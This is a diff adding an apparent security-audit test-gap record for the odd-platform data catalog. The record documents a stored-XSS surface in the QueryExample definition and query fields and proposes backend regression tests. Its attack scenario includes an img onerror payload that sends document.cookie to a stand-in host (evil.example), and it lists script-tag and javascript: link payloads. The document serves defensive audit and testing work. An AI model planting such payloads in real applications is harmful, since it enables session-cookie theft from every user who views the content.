@@ -1,0 +1,79 @@
+gap_id: TEST-GAP-732
+category: missing-security
+criticality: HIGH
+node_ids:
+  - "odd-platform java QueryExampleController controller-class:QueryExampleController"
+pillars_affected: [P-02, P-09]
+surfaced_by:
+  - "QueryExampleController.md:bugs_limitations_corner_cases.[6] (No content sanitisation on `definition` or `query` — Markdown is rendered client-side as-is — the 4th member of the F-004 surface family — severity HIGH)"
+  - "QueryExampleController.md:security.known_security_gaps.[0] (Stored-XSS via Markdown rendering of definition and/or query — 4th member of the F-004 family — severity HIGH)"
+  - "QueryExampleController.md:security.data_exposure.[4] (Markdown-rendered HTML to the browser via React UI — the definition and query fields are rendered through MDEditor.Markdown — an authenticated user who plants Markdown payload gets the payload rendered to every subsequent viewer — F-004 surface family 4th member)"
+  - "QueryExampleController.md:pillar_anchored_features (F-004 stored-XSS family — 4th surface — Markdown-rendered query body)"
+behaviour: |-
+  **HIGH — F-004 stored-XSS family extends to a FOURTH surface: the QueryExample definition + query fields rendered via `@uiw/react-md-editor`'s `MDEditor.Markdown` in two UI sites — same architectural class as the entity description, term description, and dataset_field description surfaces previously enumerated in F-004 batches.** Primary-source confirmed in the batch-V QueryExampleController sidecar:
+
+  **Storage tier — verbatim**:
+  - DB schema: `V0_0_84__create_query_example.sql:4-5` declares `definition text NOT NULL, query text NOT NULL`. PostgreSQL `text` accepts arbitrary characters up to 1GB; NO `CHECK` constraint; NO trigger transform.
+  - Service tier: `QueryExampleServiceImpl.java:42` does `queryExampleMapper.mapToPojo(formData)` — a MapStruct field-to-field copy with NO transformation, NO Jsoup.clean, NO Encode.html.
+  - Controller tier: `QueryExampleController.java:26-32` (createQueryExamples) + `:35-42` (updateQueryExample) — pure pass-through, no sanitization.
+  - OpenAPI: `components.yaml:2799-2808` — declares both fields `string` with NO `maxLength`, NO `pattern`, NO `format`.
+
+  **Render tier — Markdown executed in TWO UI sites**:
+  - `QueryExampleDetailsOverview.tsx:19` renders `definition` via `<Markdown value={queryExample.definition} disableCopy />` (the full markdown body).
+  - `QueryExampleDetailsOverview.tsx:25` renders `query` (the SQL body) ALSO via `<Markdown value={queryExample.query} disableCopy />`.
+  - `QueryExamplesListItem.tsx:45-52` renders BOTH fields via the same Markdown component in the catalog list view (every Query Examples tab + cross-entity tab + cross-term tab).
+  - The `Markdown.tsx` wrapper at the UI layer (lines 1-127 per sidecar) uses the default `MDEditor.Markdown` config — NO `rehype-sanitize` plugin, NO allowed-tags allowlist applied.
+
+  **Attack scenario**:
+  A user holding `QUERY_EXAMPLE_CREATE` (granted broadly via Administrator role per `V0_0_88__add_query_example_policy.sql:1-11`, OR via any operator-authored policy granting this permission) submits:
+  ```
+  POST /api/queryexample
+  { "definition": "<script>alert('xss')</script>",
+    "query": "<img src=x onerror=fetch('https://evil.example/exfil?cookie='+document.cookie)>" }
+  ```
+  Both fields persist verbatim. Every subsequent UI viewer of the Query Example (catalog list, dataset-tab, term-tab, details page) executes the payload in the platform's origin. The blast radius is the entire authenticated-user pool — every authenticated user can READ every query example per `system-mission.md:267` read-collaborative posture.
+
+  **Same architectural class as F-004 sisters**:
+  - F-004 surface 1: DataEntityController.upsertDataEntityInternalDescription (entity description)
+  - F-004 surface 2: TermController.createTerm + TermController.updateTerm (term description) — see TEST-GAP-720 for the related side-channel
+  - F-004 surface 3: DatasetFieldController.updateDatasetFieldDescription (column description) — see TEST-GAP-664
+  - F-004 surface 4: QueryExampleController.createQueryExamples / updateQueryExample (definition + query) — **THIS GAP**
+
+  **Why HIGH not CRITICAL**: the four surfaces share a common UI-render-tier defence-in-depth: the dynamic-verification probe P-009 (per `dynamic-verification slice 6` from the workspace) confirms that the runtime DOM-render path applies a sanitization mitigation through the React Markdown wrapper. The defence is real at the entity description path (P-009 verified); for the QueryExample surface, the defence is **inferred symmetric** because all four surfaces use the SAME `Markdown.tsx` component. The browser-tier defence reduces the practical exploitability, but the BACKEND storage contract (verbatim) plus the LACK OF any backend or service-tier sanitization means: (a) any tool that bypasses the React UI (CLI, direct API consumer, custom dashboard, OpenAPI-generated SDK consumer) renders the raw payload; (b) any regression weakening the UI defence (a rehype plugin change, a Markdown lib upgrade, a render-path bypass) re-opens the full XSS surface. HIGH is the maintenance-of-defence-in-depth posture.
+
+  **Test gap shape**: regression-pin at the BACKEND tier asserting the verbatim-storage contract for both fields; regression-pin at the UI tier (dynamic probe extension) asserting the render-tier defence applies to BOTH definition AND query fields (today the probe is verified only for the entity-description surface). The test PINS the current architectural contract: "verbatim storage + render-time defence" — any future maintainer who adds backend sanitization or weakens UI defence breaks the test, forcing an explicit design decision.
+test_files_existing:
+  - "odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/service/QueryExampleServiceTest.java (covers happy-path service operations; does NOT exercise XSS payload persistence)"
+  - "odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/repository/QueryExampleRepositoryTest.java (JOOQ-tier; presumed FTS coverage, NOT XSS-class)"
+test_files_proposed:
+  path: "odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/QueryExampleStoredXssBackendContractTest.java"
+  name: "createQueryExample_definitionAndQueryWithScriptPayloads_persistVerbatim_pinsF004FourthSurfaceBackendContract"
+evidence:
+  - "QueryExampleController.md says (bugs_limitations_corner_cases.[6]): 'No content sanitisation on definition or query — Markdown is rendered client-side as-is. The controller stores the request body verbatim (QueryExampleServiceImpl.java:42 queryExampleMapper.mapToPojo(formData) is a MapStruct field-to-field copy with no transformation) and the React UI renders both fields through @uiw/react-md-editor MDEditor.Markdown (QueryExampleDetailsOverview.tsx:19, 25 + QueryExamplesListItem.tsx:45, 52). The library is the same one identified in the F-004 stored-XSS family (TermDescription, DataEntityDescription, DatasetField description, and now QueryExample definition + query). This controller is the 4th member of the F-004 surface family.' — severity HIGH"
+  - "QueryExampleController.md says (security.known_security_gaps.[0]): 'Stored-XSS via Markdown rendering of definition and/or query — 4th member of the F-004 family — MDEditor.Markdown (the @uiw/react-md-editor library) renders user-authored Markdown in both fields without rehype-sanitize allowlist applied in Markdown.tsx' — severity HIGH"
+  - "QueryExampleController.md says (security.data_exposure.[4]): 'Markdown-rendered HTML to the browser via React UI — the definition and query fields are rendered through MDEditor.Markdown (QueryExampleDetailsOverview.tsx:19, 25 and QueryExamplesListItem.tsx:45, 52) — an authenticated user who plants Markdown payload (<script>, <img onerror=...>, link with javascript: href) in either field gets the payload rendered to every subsequent viewer. This is the F-004 surface family 4th member.'"
+  - "QueryExampleController.md says (pillar_anchored_features): 'F-004 stored-XSS family (4th surface — Markdown-rendered query body)'"
+cross_references:
+  - "F-004 (stored-XSS family — primary feature flow; this gap adds the 4th surface)"
+  - "TEST-GAP-664 (DatasetField verbatim-storage XSS — F-004 3rd surface; sister at column description)"
+  - "TEST-GAP-693 (TermDefinition rehype-raw XSS — F-004 2nd surface; sister at term description)"
+  - "TEST-GAP-719 (TermDefinition rehype-raw XSS — sister F-004 family entry)"
+  - "TEST-GAP-720 (TermServiceImpl side-channel XSS persistence — sister F-004 family entry)"
+  - "P-009 dynamic-verification probe (per workspace 2026-05-19 slice 6 — DOM-tier defence verified for entity description; recommend probe extension for QueryExample definition + query)"
+  - "REFACTOR-218 (MDEditor.Markdown rehype-raw inference — primary surface for the UI-tier render-path analysis)"
+  - "concepts: f004-fourth-surface-querysample-markdown-render (NEW concept candidate — surface the four-member family explicitly)"
+  - "DOC-NNN candidate: surface the verbatim-storage contract on the Query Examples doc page so operators understand that the SQL body is rendered as Markdown, not as code-block — paste with care"
+related_features: [F-004]
+related_pillar_features: ["P-02:F-001", "P-09:F-NN-XSS-defence"]
+proposed_action: |-
+  Add `QueryExampleStoredXssBackendContractTest` at `odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/`. Four test methods:
+  1. `createQueryExample_definitionWithScriptTag_persistsVerbatim` — POST `/api/queryexample` with `{ definition: "<script>alert('xss')</script>", query: "SELECT 1" }`; assert HTTP 200; fetch the example via `GET /api/queryexample/{id}`; assert `definition` byte-equals `<script>alert('xss')</script>` (the storage is verbatim).
+  2. `createQueryExample_queryFieldWithScriptTag_persistsVerbatim` — sister test on the query field.
+  3. `createQueryExample_definitionWithImgOnerror_persistsVerbatim` — pin the `<img onerror=...>` payload class.
+  4. `createQueryExample_queryFieldWithJavascriptUrlInLinkSyntax_persistsVerbatim` — pin `[click](javascript:alert(1))` Markdown-link-with-javascript-URL persistence.
+
+  Add a `// CONTRACT PIN: This test asserts the documented F-004 verbatim-storage architectural choice. The defence lives at the UI render layer (DefiniteDOMSanitiserPipeline + DOMPurify) per P-009 / F-004 sidecars. The Markdown.tsx wrapper applies the same defence as the entity description path — but the surface has NOT been independently dynamic-verified. A REFACTOR introducing backend sanitization will flip these tests to assert the chosen sanitiser output. A REFACTOR weakening the UI defence will require this storage layer to gain sanitisation; the test pair documents both ends of the contract.` comment block.
+
+  Pair with: (a) a P-009 dynamic-verification probe extension covering the QueryExample render surfaces (catalog list, details page, dataset tab, term tab); (b) a DOC-NNN candidate disclosing the Markdown-rendering of the SQL body (the doc currently shows it as code-block-rendered).
+batch: 2026-05-20-V
+feature_id: F-004
